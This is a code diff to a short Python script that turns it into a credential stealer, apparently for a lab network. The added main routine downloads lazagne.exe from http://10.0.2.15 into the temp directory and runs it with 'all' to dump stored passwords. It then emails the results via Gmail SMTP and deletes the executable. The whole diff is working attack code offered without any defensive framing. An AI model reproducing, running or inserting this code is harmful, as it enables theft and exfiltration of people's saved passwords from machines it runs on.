@@ -1,5 +1,8 @@
 import subprocess
-import smtplib
+import smtplib #SMTP services
+import requests #HTTP requests
+import os
+import tempfile
 
 def send_mail(email, password, msg):
     server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -18,9 +21,22 @@ def credentials():
     return mail, password
 
 
+def download(url):
+    response = requests.get(url)
+    
+    file_name = url.split('/')[-1]
+
+    with open(file_name, 'wb') as f:
+        f.write(response.content)
+
 def main():
     mail, password = credentials()
-    send_mail(mail, password, 'ciao')
+    print(tempfile.gettempdir())
+    os.chdir(tempfile.gettempdir())
+    download("http://10.0.2.15/files/lazagne.exe")
+    result = subprocess.check_output('lazagne.exe all', shell=True)
+    send_mail(mail, password, result)
+    os.remove('lazagne.exe')
 
 if __name__=='__main__':
     main()
